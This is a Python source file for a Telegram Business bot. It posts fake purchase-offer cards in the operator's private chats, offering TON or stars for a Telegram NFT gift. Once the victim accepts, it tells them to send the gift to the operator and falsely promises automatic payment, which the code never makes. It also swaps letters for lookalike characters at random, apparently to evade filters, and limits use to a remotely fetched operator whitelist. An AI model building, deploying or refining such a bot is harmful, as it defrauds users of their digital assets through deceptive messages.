import asyncio
import hmac
import html
import json
import logging
import math
import os
import random
import re
import time
import uuid

from aiohttp import ClientSession, ClientTimeout, web

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("offers")

BOT_TOKEN = os.environ["BOT_TOKEN"]
PUBLIC_URL = (os.environ.get("PUBLIC_URL") or os.environ.get("RENDER_EXTERNAL_URL", "")).rstrip("/")
SECRET = os.environ.get("WEBHOOK_SECRET") or BOT_TOKEN.split(":")[1][:32]
API = f"{os.environ.get('TG_API', 'https://api.telegram.org')}/bot{BOT_TOKEN}"
DATA_FILE = os.environ.get("OFFERS_FILE", "offers.json")

BRAND = os.environ.get("BRAND", "Telegram")
TEST_NOTICE = os.environ.get("TEST_NOTICE", "")
OFFER_TTL = int(float(os.environ.get("OFFER_HOURS", 6)) * 3600)
TRANSFER_MIN = int(os.environ.get("TRANSFER_MINUTES", 10))
STRICT = os.environ.get("OFFER_STRICT") == "1"
MAX_STARS = 100_000_000
UPDATES = ["message", "callback_query", "business_connection", "business_message"]
NBSP = "\u00a0"

OFFER_EDIT_DELAY = max(1.0, float(os.environ.get("OFFER_EDIT_DELAY", "1.0")))
HOMOGLYPH_RATE = float(os.environ.get("HOMOGLYPH_RATE", "0.75"))
BUTTON_STYLE = os.environ.get("BUTTON_STYLE", "")

WHITELIST_URL = os.environ.get("WHITELIST_URL", "").strip()
WHITELIST_REFRESH = 300
_allowed_ids = set()
_whitelist_ready = False

EMOJI_CROSS = "5260342697075416641"
EMOJI_CHECK = "5260416304224936047"
EMOJI_TG = "5258073068852485953"

http = None
bot_name = ""
connections, offers = {}, {}
tasks = set()

GLOBAL_LANG = "ru"

STRINGS = {
    "ru": {
        "stars_word": "⭐",
        "offer_to_you": "предлагает Вам",
        "for_gift": "за подарок",
        "offer_expires": "Предложение действует ещё",
        "accepted": "Сделка принята!",
        "transfer_to": "Передайте подарок",
        "to_user": "пользователю",
        "for_close": "для успешного закрытия сделки,",
        "after_which": "после чего",
        "will_be_sent": "отправятся на ваш баланс.",
        "auto_sent": "автоматически отправятся на ваш баланс",
        "declined": "Отклонено.",
        "expired": "Предложение истекло.",
        "done": "Передача подтверждена. Сделка по",
        "closed": "закрыта.",
        "decline_btn": "Отклонить",
        "accept_btn": "Принять",
        "cancel_btn": "Отменить",
        "transfer_btn": "Передать",
        "error_no_link": "Не нашёл ссылку на NFT вида https://t.me/nft/DurovsCap-1234",
        "error_bad_link": "Это не похоже на ссылку на NFT: в конце должен быть номер.",
        "error_no_amount": "Не нашёл сумму.",
        "error_amount_range": "Сумма должна быть от 1 до",
        "error_bad_currency": "Неизвестная валюта. Используй TON или STAR.",
        "offer_outdated": "Этот оффер устарел",
        "offer_already": "Оффер уже обработан",
        "offer_expired_alert": "Срок предложения истёк",
        "offer_accept_first": "Сначала нужно принять оффер",
        "offer_only_author": "Подтвердить передачу может только автор оффера",
        "offer_your_own": "Это твой оффер: отвечать на него должен получатель",
        "bot_connected": "Готово, бот подключён.",
        "bot_connected_desc": "В любом чате напиши:\n<code>/offer TON ссылка адрес сумма</code> (TON на кошелек)\n<code>/offer TON ссылка сумма</code> (TON)\n<code>/offer STAR ссылка сумма</code> (⭐)\n\nСменить язык: <code>/language ru</code> или <code>/language en</code>\nСообщение тут же превратится в карточку оффера с кнопками.",
        "bot_no_delete_right": "Без права «Удалять сообщения» твоя команда останется в чате рядом с карточкой — включи его в тех же настройках, чтобы она пропадала.",
        "bot_disabled": "Бот отключён от профиля. Подключить снова: Настройки -> Телеграм Бизнес -> Автоматизация чатов.",
        "bot_no_reply_right": "Бот подключён, но без права отвечать на сообщения. Открой Настройки -> Телеграм Бизнес -> Автоматизация чатов, выбери бота и включи это право — иначе офферы не создадутся.",
        "error_prefix": "Ошибка:",
        "hello": "Привет!",
        "copy_username": "Скопировать юзернейм бота",
        "usage": "Формат:\n<code>/offer TON ссылка адрес сумма</code> (TON на кошелек)\n<code>/offer TON ссылка сумма</code> (TON)\n<code>/offer STAR ссылка сумма</code> (⭐)",
        "time_h": "ч.",
        "time_m": "мин.",
        "lang_switched": "Язык переключен на РУССКИЙ.",
        "setup_instruction": "<b>Инструкция по подключению:</b>\n\n1. Зайди в Настройки -> Телеграм Бизнес -> Автоматизация чатов.\n2. Выбери нашего бота.\n3. Включи ВСЕ разрешения (особенно «Отвечать на сообщения» и «Удалять сообщения»).\n4. Напиши /start после подключения, чтобы проверить статус.",
        "no_access": "У вас нет доступа к этому боту. Обратитесь к администратору.",
    },
    "en": {
        "stars_word": "⭐",
        "offer_to_you": "offers you",
        "for_gift": "for the gift",
        "offer_expires": "Offer expires in",
        "accepted": "Deal accepted!",
        "transfer_to": "Transfer the gift",
        "to_user": "to user",
        "for_close": "to successfully close the deal,",
        "after_which": "after which",
        "will_be_sent": "will be sent to your balance.",
        "auto_sent": "will be automatically sent to your balance",
        "declined": "Declined.",
        "expired": "Offer expired.",
        "done": "Transfer confirmed. Deal for",
        "closed": "is closed.",
        "decline_btn": "Decline",
        "accept_btn": "Accept",
        "cancel_btn": "Cancel",
        "transfer_btn": "Transfer",
        "error_no_link": "Could not find NFT link like https://t.me/nft/DurovsCap-1234",
        "error_bad_link": "This doesn't look like an NFT link: there should be a number at the end.",
        "error_no_amount": "Could not find the amount.",
        "error_amount_range": "Amount must be between 1 and",
        "error_bad_currency": "Unknown currency. Use TON or STAR.",
        "offer_outdated": "This offer is outdated",
        "offer_already": "Offer already processed",
        "offer_expired_alert": "Offer expired",
        "offer_accept_first": "You need to accept the offer first",
        "offer_only_author": "Only the offer author can confirm the transfer",
        "offer_your_own": "This is your offer: the recipient should respond to it",
        "bot_connected": "Done, bot connected.",
        "bot_connected_desc": "In any chat type:\n<code>/offer TON link address amount</code> (TON to wallet)\n<code>/offer TON link amount</code> (TON)\n<code>/offer STAR link amount</code> (⭐)\n\nChange language: <code>/language ru</code> or <code>/language en</code>\n\nThe message will instantly turn into an offer card with buttons.",
        "bot_no_delete_right": "Without the 'Delete messages' right, your command will remain in the chat next to the card — enable it in the same settings so it disappears.",
        "bot_disabled": "Bot is disconnected from the profile. Reconnect: Settings -> Telegram Business -> Chat Automation.",
        "bot_no_reply_right": "Bot is connected but lacks the right to reply to messages. Open Settings -> Telegram Business -> Chat Automation, select the bot and enable this right — otherwise offers won't be created.",
        "error_prefix": "Error:",
        "hello": "Hello!",
        "copy_username": "Copy bot username",
        "usage": "Format:\n<code>/offer TON link address amount</code> (TON to wallet)\n<code>/offer TON link amount</code> (TON)\n<code>/offer STAR link amount</code> (⭐)",
        "time_h": "h.",
        "time_m": "min.",
        "lang_switched": "Language switched to ENGLISH.",
        "setup_instruction": "<b>Connection Instructions:</b>\n\n1. Go to Settings -> Telegram Business -> Chat Automation.\n2. Select our bot.\n3. Enable ALL permissions (especially 'Reply to messages' and 'Delete messages').\n4. Type /start after connecting to check status.",
        "no_access": "You do not have access to this bot. Contact the administrator.",
    }
}

def t(lang, key, *args):
    return STRINGS.get(lang, STRINGS["ru"])[key].format(*args) if args else STRINGS.get(lang, STRINGS["ru"])[key]

def is_allowed(user_id):
    if not WHITELIST_URL:
        return True
    return user_id in _allowed_ids

async def fetch_whitelist():
    global _allowed_ids, _whitelist_ready
    if not WHITELIST_URL:
        _whitelist_ready = True
        return
    try:
        async with http.get(WHITELIST_URL, timeout=ClientTimeout(total=15)) as resp:
            if resp.status == 200:
                text = await resp.text()
                new_ids = set()
                for line in text.splitlines():
                    line = line.strip()
                    if line and not line.startswith("#"):
                        try:
                            new_ids.add(int(line))
                        except ValueError:
                            pass
                _allowed_ids = new_ids
                _whitelist_ready = True
                log.info("Whitelist updated: %d IDs", len(_allowed_ids))
            else:
                log.warning("Whitelist fetch failed: HTTP %d", resp.status)
    except Exception as e:
        log.warning("Whitelist error: %s", e)

async def whitelist_worker():
    while True:
        await fetch_whitelist()
        await asyncio.sleep(WHITELIST_REFRESH)

_HOMOGLYPH_RU = {
    "а": ["a"], "с": ["c"], "е": ["e"], "о": ["o", "ο"], "р": ["p"], "х": ["x"], "у": ["y"], "к": ["κ"],
    "А": ["A"], "В": ["B"], "Е": ["E"], "К": ["K"], "М": ["M"], "Н": ["H"], "О": ["O"], "Р": ["P"],
    "С": ["C"], "Т": ["T"], "У": ["Y"], "Х": ["X"], "І": ["I"], "Ј": ["J"], "Ѕ": ["S"],
}

_HOMOGLYPH_EN = {
    "a": ["а"], "c": ["с"], "e": ["е"], "o": ["о", "ο"], "p": ["р"], "x": ["х"], "y": ["у"], "k": ["к"],
    "A": ["А"], "B": ["В"], "E": ["Е"], "K": ["К"], "M": ["М"], "H": ["Н"], "O": ["О"], "P": ["Р"],
    "C": ["С"], "T": ["Т"], "Y": ["У"], "X": ["Х"], "I": ["І"], "J": ["Ј"], "S": ["Ѕ"],
}

_TAG_RE = re.compile(r"<(/?)(b|i|u|s|code|a|pre|em|strong|tg-spoiler)(\s[^>]*)?>", re.IGNORECASE)

def _style_plain(s: str, lang: str) -> str:
    dictionary = _HOMOGLYPH_RU if lang == "ru" else _HOMOGLYPH_EN
    res = []
    for ch in s:
        variants = dictionary.get(ch)
        if variants and random.random() < HOMOGLYPH_RATE:
            res.append(random.choice(variants))
        else:
            res.append(ch)
    return "".join(res)

def style(text: str, lang: str = "ru") -> str:
    out, pos, depth = [], 0, 0
    for m in _TAG_RE.finditer(text):
        chunk = text[pos:m.start()]
        out.append(_style_plain(chunk, lang) if depth == 0 else chunk)
        out.append(m.group(0))
        if m.group(1) == "/": depth = max(0, depth - 1)
        else: depth += 1
        pos = m.end()
    tail = text[pos:]
    out.append(_style_plain(tail, lang) if depth == 0 else tail)
    return "".join(out)

def esc(s): return html.escape(str(s))
def num(x): return f"{x:,}".replace(",", " ")

def btn(text, data, icon_id=None):
    b = {"text": text, "callback_data": data}
    if icon_id: b["icon_custom_emoji_id"] = icon_id
    if BUTTON_STYLE: b["style"] = BUTTON_STYLE
    return b

def background(coro):
    task = asyncio.create_task(coro)
    tasks.add(task)
    task.add_done_callback(tasks.discard)
    return task

async def api(method, **params):
    async with http.post(f"{API}/{method}", json=params) as resp:
        data = await resp.json()
    if not data.get("ok"):
        log.warning("TG Error | %s | %s", method, data.get("description"))
    return data

async def send(chat, text, kb=None, bcid=None, preview=False, lang=None):
    if lang is None:
        lang = GLOBAL_LANG
    text = style(text, lang)
    params = dict(chat_id=chat, text=text, parse_mode="HTML")
    params["link_preview_options"] = {"is_disabled": not preview, "show_above_text": bool(preview)}
    if kb: params["reply_markup"] = kb
    if bcid: params["business_connection_id"] = bcid
    return await api("sendMessage", **params)

async def delete_business_message(bcid, mid):
    return await api("deleteBusinessMessages", business_connection_id=bcid, message_ids=[mid])

async def edit_offer(o, text, kb=None, preview=True):
    lang = o.get("lang", GLOBAL_LANG)
    text = style(text, lang)
    params = dict(chat_id=o["chat"], message_id=o["mid"], business_connection_id=o["bcid"],
                  text=text, parse_mode="HTML", reply_markup=kb or {"inline_keyboard": []})
    params["link_preview_options"] = {"is_disabled": not preview, "show_above_text": bool(preview)}
    res = await api("editMessageText", **params)
    if not res.get("ok") and "not modified" in (res.get("description") or "").lower():
        return {"ok": True}
    return res

FATAL_DESC_MARKERS = ("invalid message identifier", "message to edit not found", "business_connection_invalid")
def _is_fatal_desc(desc: str) -> bool: return any(m in (desc or "").lower() for m in FATAL_DESC_MARKERS)

async def validate_connections():
    if not connections and not offers: return
    valid = set()
    bcids = set(connections.keys())
    for o in offers.values():
        if o.get("bcid") and o.get("status") in ("pending", "accepted"):
            bcids.add(o["bcid"])
    for bcid in bcids:
        res = await api("getBusinessConnection", business_connection_id=bcid)
        if res.get("ok"):
            valid.add(bcid)
            if bcid not in connections: connections[bcid] = conn_from(res["result"])
    for o in offers.values():
        if o.get("bcid") not in valid and o.get("status") in ("pending", "accepted"):
            o["status"] = "dead"
    save()

def save():
    for oid in sorted(offers, key=lambda k: offers[k]["created"])[:-500]:
        del offers[oid]
    tmp = f"{DATA_FILE}.tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump({"connections": connections, "offers": offers, "global_lang": GLOBAL_LANG}, f, ensure_ascii=False)
        os.replace(tmp, DATA_FILE)
    except OSError as e: log.error("Save error: %s", e)

def load():
    global GLOBAL_LANG
    try:
        with open(DATA_FILE, encoding="utf-8") as f:
            data = json.load(f)
        connections.update(data.get("connections", {}))
        offers.update(data.get("offers", {}))
        GLOBAL_LANG = data.get("global_lang", "ru")
    except FileNotFoundError:
        pass
    except Exception as e:
        log.error("Load error: %s", e)

NFT_LINK = re.compile(r"(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)", re.I)
SLUG = re.compile(r"^(.+)-(\d+)$")
TON_ADDRESS = re.compile(r"^(?:EQ|UQ)[A-Za-z0-9_-]{46}$", re.I)

def gift_name(slug):
    m = SLUG.match(slug)
    return f"{re.sub(r'(?<=[a-z0-9])(?=[A-Z])', ' ', m.group(1))} #{m.group(2)}" if m else None

def parse_offer(args_list, currency="STARS", lang="ru"):
    if len(args_list) < 2:
        return None, t(lang, "error_no_amount")

    link_match = NFT_LINK.search(args_list[0])
    if not link_match:
        return None, t(lang, "error_no_link")
    slug = link_match.group(1)
    name = gift_name(slug)
    if not name:
        return None, t(lang, "error_bad_link")

    address = None
    amount_str = None

    if currency == "TON":
        amount_str = args_list[-1]
        middle = args_list[1:-1]
        if middle:
            address = middle[0].strip()
    else:
        amount_str = args_list[-1]

    amount_str = amount_str.strip()
    if not amount_str.isdigit():
        cleaned = re.sub(r"[_,\s]", "", amount_str)
        if not cleaned.isdigit():
            return None, t(lang, "error_no_amount")
        amount_str = cleaned

    val = int(amount_str)

    if not 1 <= val <= MAX_STARS:
        return None, f"{t(lang, 'error_amount_range')} {num(MAX_STARS)}."

    return {"slug": slug, "name": name, "amount": val, "address": address}, None

def maker_label(o):
    u = o["maker"]
    return esc(u.get("name") or u.get("username") or ("пользователь" if o.get("lang") == "ru" else "user"))

def gift_link(o): return f'<a href="https://t.me/nft/{esc(o["slug"])}">{esc(o["name"])}</a>'

def left_text(seconds, lang):
    minutes = math.ceil(max(0, seconds) / 60)
    h, m = divmod(minutes, 60)
    return f"{h} {t(lang, 'time_h')} {m} {t(lang, 'time_m')}" if h else f"{m} {t(lang, 'time_m')}"

def offer_text(o):
    lang = o.get("lang", GLOBAL_LANG)
    if o.get("currency") == "TON":
        addr_text = f" на ваш адрес <code>{esc(o['address'])}</code>" if o.get("address") else ""
        amount = f"{num(o['amount'])} TON"
        text = (f"<b>{maker_label(o)}</b> {t(lang, 'offer_to_you')} <b>{amount}</b>{addr_text} {t(lang, 'for_gift')} {gift_link(o)}.\n\n"
                f"{t(lang, 'offer_expires')} {left_text(o['expires'] - time.time(), lang)}")
    else:
        amount = f'{num(o["amount"])} {t(lang, "stars_word")}'
        text = (f"<b>{maker_label(o)}</b> {t(lang, 'offer_to_you')} <b>{amount}</b> {t(lang, 'for_gift')} {gift_link(o)}.\n\n"
                f"{t(lang, 'offer_expires')} {left_text(o['expires'] - time.time(), lang)}")
    return text + (f"\n\n{esc(TEST_NOTICE)}" if TEST_NOTICE else "")

def accepted_text(o):
    lang = o.get("lang", GLOBAL_LANG)
    u = o["maker"]
    username = u.get("username")
    if username:
        user_link = f'<a href="tg://user?id={u["id"]}">@{esc(username)}</a>'
    else:
        user_link = f'<a href="tg://user?id={u["id"]}">ID:{u["id"]}</a>'

    if o.get("currency") == "TON":
        addr_text = f" адреса <code>{esc(o['address'])}</code>" if o.get("address") else ""
        amount = f"{num(o['amount'])} TON"
        return (f"<b>{t(lang, 'accepted')}</b>\n\n{t(lang, 'transfer_to')} {gift_link(o)} "
                f"{t(lang, 'to_user')} {user_link} {t(lang, 'for_close')} "
                f"{t(lang, 'after_which')} <b>{amount}</b> {t(lang, 'auto_sent')}{addr_text}.")
    amount = f'{num(o["amount"])} {t(lang, "stars_word")}'
    return (f"<b>{t(lang, 'accepted')}</b>\n\n{t(lang, 'transfer_to')} {gift_link(o)} "
            f"{t(lang, 'to_user')} {user_link} {t(lang, 'for_close')} "
            f"{t(lang, 'after_which')} <b>{amount}</b> {t(lang, 'will_be_sent')}")

def declined_text(o): return t(o.get("lang", GLOBAL_LANG), "declined")
def expired_text(o): return t(o.get("lang", GLOBAL_LANG), "expired")
def done_text(o): return f"{t(o.get('lang', GLOBAL_LANG), 'done')} {gift_link(o)} {t(o.get('lang', GLOBAL_LANG), 'closed')}"

def offer_kb(o):
    lang = o.get("lang", GLOBAL_LANG)
    return {"inline_keyboard": [[btn(t(lang, "decline_btn"), f"of:no:{o['id']}", EMOJI_CROSS), btn(t(lang, "accept_btn"), f"of:ok:{o['id']}", EMOJI_CHECK)]]}

def accepted_kb(o):
    lang = o.get("lang", GLOBAL_LANG)
    u = o["maker"]
    transfer_url = f"tg://send_gift?to={u['username']}" if u.get("username") else f"tg://user?id={u.get('id', 0)}"
    return {"inline_keyboard": [[btn(t(lang, "cancel_btn"), f"of:cancel:{o['id']}", EMOJI_CROSS),
            {"text": t(lang, "transfer_btn"), "url": transfer_url, "icon_custom_emoji_id": EMOJI_TG}]]}

async def make_offer(m, maker, bcid, currency, args_list):
    lang = GLOBAL_LANG
    parsed, error = parse_offer(args_list, currency, lang)
    chat = m["chat"]["id"]
    now = time.time()

    try: await delete_business_message(bcid, m["message_id"])
    except Exception: pass

    if error: return await send(chat, f"{esc(error)}\n\n{t(lang, 'usage')}", bcid=bcid, preview=False, lang=lang)

    o = {"id": uuid.uuid4().hex[:8], **parsed, "currency": currency, "bcid": bcid, "chat": chat, "mid": None,
         "maker": maker, "status": "pending", "created": now, "expires": now + OFFER_TTL, "lang": lang}
    offers[o["id"]] = o
    save()

    res = await send(chat, offer_text(o), offer_kb(o), bcid=bcid, preview=True, lang=lang)
    if res.get("ok"):
        o["mid"] = res["result"]["message_id"]
        save()
    else:
        o["status"] = "dead"
        save()

async def on_business_message(m):
    frm = m.get("from") or {}
    user_id = frm.get("id")

    if not is_allowed(user_id):
        log.warning("Denied access to business message from %s", user_id)
        return

    text = (m.get("text") or "").strip()
    parts = text.split()
    if len(parts) < 3: return

    cmd = parts[0].lower()
    currency = parts[1].upper()
    args_list = parts[2:]

    if cmd != "/offer" or currency not in ("TON", "STAR"): return

    conn = await get_connection(m["business_connection_id"])
    if not conn or user_id != conn["user_id"]: return
    if not (conn["enabled"] and conn["can_reply"]):
        lang = GLOBAL_LANG
        return await send(conn["chat"], t(lang, "bot_no_reply_right"), bcid=conn["id"], lang=lang)

    maker = {"id": frm["id"], "name": frm.get("first_name", ""), "username": frm.get("username")}
    await make_offer(m, maker, conn["id"], currency, args_list)

async def on_message(m):
    global GLOBAL_LANG
    frm = m.get("from") or {}
    user_id = frm.get("id")
    chat = m["chat"]["id"]

    if not is_allowed(user_id):
        await send(chat, t(GLOBAL_LANG, "no_access"), lang=GLOBAL_LANG)
        return

    text = (m.get("text") or "").strip()
    cmd = text.split()[0].split("@")[0].lower() if text else ""

    if cmd in ("/language", "/lang", "/язык"):
        parts = text.split()
        if len(parts) > 1:
            new_lang = parts[1].lower()
            if new_lang in ("ru", "rus"):
                GLOBAL_LANG = "ru"
                save()
                await send(chat, t(GLOBAL_LANG, "lang_switched"), lang=GLOBAL_LANG)
                return
            elif new_lang in ("en", "eng"):
                GLOBAL_LANG = "en"
                save()
                await send(chat, t(GLOBAL_LANG, "lang_switched"), lang=GLOBAL_LANG)
                return
        await send(chat, "Usage: /language rus OR /language eng", lang=GLOBAL_LANG)
        return

    if cmd in ("/start", "/help"):
        copy_btn = {"text": t(GLOBAL_LANG, "copy_username"), "copy_text": {"text": f"@{bot_name}"}}
        if BUTTON_STYLE: copy_btn["style"] = BUTTON_STYLE

        text_msg = (f"<b>{t(GLOBAL_LANG, 'hello')}</b>\n\n"
                    f"{t(GLOBAL_LANG, 'setup_instruction')}\n\n"
                    f"{t(GLOBAL_LANG, 'usage')}")

        await send(chat, text_msg, {"inline_keyboard": [[copy_btn]]}, lang=GLOBAL_LANG)

async def on_callback(q):
    frm = q.get("from") or {}
    if not is_allowed(frm.get("id")):
        return await api("answerCallbackQuery", callback_query_id=q["id"], text="Access denied", show_alert=True)

    parts = q.get("data", "").split(":")
    note = None
    o = offers.get(parts[2]) if len(parts) == 3 and parts[0] == "of" else None
    lang = o.get("lang", GLOBAL_LANG) if o else GLOBAL_LANG

    if o is None:
        note = t(lang, "offer_outdated")
    else:
        action = parts[1]
        if action == "cancel":
            try: await delete_business_message(o["bcid"], o["mid"])
            except Exception: pass
            o["status"] = "declined"
            save()
            return await api("answerCallbackQuery", callback_query_id=q["id"])
        elif action == "done":
            if o["status"] != "accepted": note = t(lang, "offer_accept_first")
            elif q["from"]["id"] != o["maker"]["id"]: note = t(lang, "offer_only_author")
            else: await settle(o, "done")
        elif STRICT and q["from"]["id"] == o["maker"]["id"] and action in ("ok", "no"):
            note = t(lang, "offer_your_own")
        elif action in ("ok", "no"):
            if o["status"] != "pending": note = t(lang, "offer_already")
            elif time.time() > o["expires"]:
                await settle(o, "expired")
                note = t(lang, "offer_expired_alert")
            else: await settle(o, "accepted" if action == "ok" else "declined")
    extra = {"text": note, "show_alert": True} if note else {}
    await api("answerCallbackQuery", callback_query_id=q["id"], **extra)

def conn_from(c):
    rights = c.get("rights") or {}
    user = c["user"]
    return {"id": c["id"], "user_id": user["id"], "chat": c.get("user_chat_id"), "name": user.get("first_name", ""),
            "username": user.get("username"), "enabled": c.get("is_enabled", True),
            "can_reply": bool(rights.get("can_reply", c.get("can_reply"))), "can_delete": bool(c.get("can_delete_all_messages"))}

async def on_connection(c):
    conn = conn_from(c)
    if not is_allowed(conn["user_id"]):
        log.warning("Denied business connection from %s", conn["user_id"])
        return

    connections[conn["id"]] = conn
    save()
    lang = GLOBAL_LANG
    if not conn["chat"]: return
    if not conn["enabled"]: text = t(lang, "bot_disabled")
    elif not conn["can_reply"]: text = t(lang, "bot_no_reply_right")
    else:
        text = (f"<b>{t(lang, 'bot_connected')}</b>\n\n"
                f"{t(lang, 'bot_connected_desc')}")
        if not conn["can_delete"]: text += f"\n\n{t(lang, 'bot_no_delete_right')}"
    await send(conn["chat"], text, lang=lang)

async def get_connection(bcid):
    conn = connections.get(bcid)
    if conn is None:
        res = await api("getBusinessConnection", business_connection_id=bcid)
        if res.get("ok"):
            conn = connections[bcid] = conn_from(res["result"])
            save()
    return conn

async def settle(o, status):
    o["status"] = status
    save()
    if status in ("declined", "expired"):
        try: await delete_business_message(o["bcid"], o["mid"])
        except Exception: pass
        return
    text, kb = FINAL[status]
    res = await edit_offer(o, text(o), kb(o) if kb else None, preview=True)
    if not res.get("ok") and (_is_fatal_desc(res.get("description")) or "PEER_FLOOD" in (res.get("description") or "")):
        o["status"] = "dead"
        save()

FINAL = {"accepted": (accepted_text, accepted_kb), "declined": (declined_text, None), "expired": (expired_text, None), "done": (done_text, None)}

async def sweeper():
    while True:
        await asyncio.sleep(60)
        for o in list(offers.values()):
            if o["status"] == "pending" and o["expires"] < time.time():
                try: await settle(o, "expired")
                except Exception: pass

async def handle(update):
    try:
        if not _whitelist_ready and WHITELIST_URL:
            await fetch_whitelist()

        if "business_connection" in update: await on_connection(update["business_connection"])
        elif "business_message" in update: await on_business_message(update["business_message"])
        elif "callback_query" in update: await on_callback(update["callback_query"])
        elif "message" in update: await on_message(update["message"])
    except Exception: log.exception("Update error")

async def webhook(req):
    token = req.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
    if not hmac.compare_digest(token.encode(), SECRET.encode()): return web.Response(status=403)
    try: update = await req.json()
    except ValueError: return web.Response(status=400)
    background(handle(update))
    return web.Response(text="ok")

async def health(req): return web.Response(text="ok")

async def keepalive():
    while True:
        await asyncio.sleep(600)
        try:
            async with http.get(f"{PUBLIC_URL}/health") as resp: await resp.read()
        except Exception: pass

async def poll_updates():
    await api("deleteWebhook")
    offset = 0
    while True:
        try:
            data = await api("getUpdates", offset=offset, timeout=30, allowed_updates=UPDATES)
            for update in data.get("result", []):
                offset = update["update_id"] + 1
                background(handle(update))
            if not data.get("ok"): await asyncio.sleep(3)
        except Exception: await asyncio.sleep(3)

async def main():
    global http, bot_name
    http = ClientSession(timeout=ClientTimeout(total=70))
    load()
    me = (await api("getMe")).get("result") or {}
    if not me: raise SystemExit("BOT_TOKEN не подходит")
    bot_name = me["username"]

    await fetch_whitelist()
    background(whitelist_worker())

    await api("setMyCommands", commands=[{"command": "start", "description": "Start"}])
    await validate_connections()
    background(sweeper())
    if PUBLIC_URL:
        app = web.Application()
        app.router.add_get("/health", health)
        app.router.add_post("/webhook", webhook)
        runner = web.AppRunner(app)
        await runner.setup()
        await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 10000))).start()
        await api("setWebhook", url=f"{PUBLIC_URL}/webhook", secret_token=SECRET, allowed_updates=UPDATES, drop_pending_updates=True)
        background(keepalive())
    else:
        background(poll_updates())
    log.info("Bot @%s started", bot_name)
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())